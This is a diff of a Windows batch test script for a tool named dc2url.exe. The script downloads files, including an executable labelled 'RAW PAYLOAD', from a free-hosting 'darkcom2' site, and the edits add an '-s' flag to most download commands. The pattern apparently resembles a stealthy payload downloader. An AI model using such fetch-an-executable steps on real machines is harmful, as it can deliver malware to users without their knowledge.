@@ -40,7 +40,7 @@ echo.
 echo    %BOLD%%RED%[TEST 01 / 04]%RESET% %BOLD%%ORANGE%WEBVIEW2 STANDARD ENGINE (-l)%RESET%
 echo    Target : %BLUE%%TEXT_URL%%RESET%
 if exist test_s1.json del /f /q test_s1.json
-dc2url.exe -l -v "%TEXT_URL%" -o "%~dp0test_s1.json" >nul 2>&1
+dc2url.exe -l -v -s "%TEXT_URL%" -o "%~dp0test_s1.json" >nul 2>&1
 if exist test_s1.json (
     for %%A in (test_s1.json) do set "sz=%%~zA"
     echo    Result : %GREEN%SUCCESS%RESET% ^| Committed: !sz! Bytes
@@ -55,7 +55,7 @@ echo.
 echo    %BOLD%%RED%[TEST 02 / 04]%RESET% %BOLD%%ICE%WEBVIEW2 WITH FAST-PATH STUB (-l -nojs)%RESET%
 echo    Target : %BLUE%%TEXT_URL%%RESET%
 if exist test_s2.json del /f /q test_s2.json
-dc2url.exe -l -v -nojs "%TEXT_URL%" -o "%~dp0test_s2.json" >nul 2>&1
+dc2url.exe -l -v -s "%TEXT_URL%" -o "%~dp0test_s2.json" >nul 2>&1
 if exist test_s2.json (
     for %%B in (test_s2.json) do set "sz=%%~zB"
     echo    Result : %GREEN%SUCCESS%RESET% ^| Committed: !sz! Bytes
@@ -76,7 +76,7 @@ echo    %BOLD%%RED%[TEST 03 / 04]%RESET% %BOLD%%ORANGE%DC2WS2 WINSOCK/WINHTTP EN
 echo    Target : %BLUE%%IMAGE_URL%/%MENU_NAME%%RESET%
 if exist "%~dp0%MENU_NAME%" del /f /q "%~dp0%MENU_NAME%"
 
-dc2url.exe -l -v -dc2ws2 "%IMAGE_URL%/%MENU_NAME%" -o "%~dp0%MENU_NAME%"
+dc2url.exe -l -s -dc2ws2 "%IMAGE_URL%/%MENU_NAME%" -o "%~dp0%MENU_NAME%"
 
 if exist "%~dp0%MENU_NAME%" (
     for %%I in ("%~dp0%MENU_NAME%") do set "sz=%%~zI"
@@ -93,7 +93,7 @@ echo    %BOLD%%RED%[TEST 04 / 04]%RESET% %BOLD%%ICE%DIRECT RAW PAYLOAD DOWNLOAD 
 echo    Target : %BLUE%%AUDIO_URL%/%EXE_NAME%%RESET%
 if exist "%~dp0%EXE_NAME%" del /f /q "%~dp0%EXE_NAME%"
 
-dc2url.exe -l -dc2ws2 -v "%AUDIO_URL%/%EXE_NAME%" -o "%~dp0%EXE_NAME%"
+dc2url.exe -l -s -dc2ws2 "%AUDIO_URL%/%EXE_NAME%" -o "%~dp0%EXE_NAME%"
 
 if exist "%~dp0%EXE_NAME%" (
     for %%I in ("%~dp0%EXE_NAME%") do set "sz=%%~zI"
@@ -113,7 +113,7 @@ echo.
 :: CONFIGURATION LAYER (Matrix 2 Binary Downloads)
 set "TEXT_URL=https://mercwar01.byethost3.com/darkcom2/echo.php"
 set "M2_NAME1=eclipse.png"
-set "M2_NAME2=eclipse.ico"
+set "M2_NAME2=eclipse.zip"
 set "M2_URL1=https://mercwar01.byethost3.com/darkcom2/downlink/eclipse"
 set "M2_URL2=https://mercwar01.byethost3.com/darkcom2/downlink/eclipse"
 
